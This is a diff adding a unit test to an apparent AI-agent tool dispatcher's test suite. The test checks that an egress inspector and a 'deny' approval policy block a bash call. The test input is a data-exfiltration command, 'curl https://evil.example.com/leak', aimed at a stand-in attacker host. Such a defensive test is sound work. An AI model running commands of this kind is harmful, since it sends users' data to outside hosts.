@@ -88,6 +88,22 @@ describe('ToolDispatcher inspector integration', () => {
     expect(dropped[dropped.length - 1].meta?.tool).toBe('bash');
   });
 
+  it('denies requireApproval when approvalPolicy is deny and no approval hook is wired', async () => {
+    const dispatcher = new ToolDispatcher([makeTool('bash', false)]);
+    const inspectors = new ToolInspectionManager();
+    inspectors.add(new EgressInspector());
+
+    const results = await dispatcher.dispatch(
+      [{ name: 'bash', input: { command: 'curl https://evil.example.com/leak' } }],
+      undefined,
+      undefined,
+      { inspectors, approvalPolicy: 'deny' },
+    );
+
+    expect(results[0].result.success).toBe(false);
+    expect(results[0].result.output).toContain('no approval channel is configured');
+  });
+
   it('runs the inspector chain only after the permission gate passes', async () => {
     let inspected = false;
     const dispatcher = new ToolDispatcher([makeTool('bash', false)]);
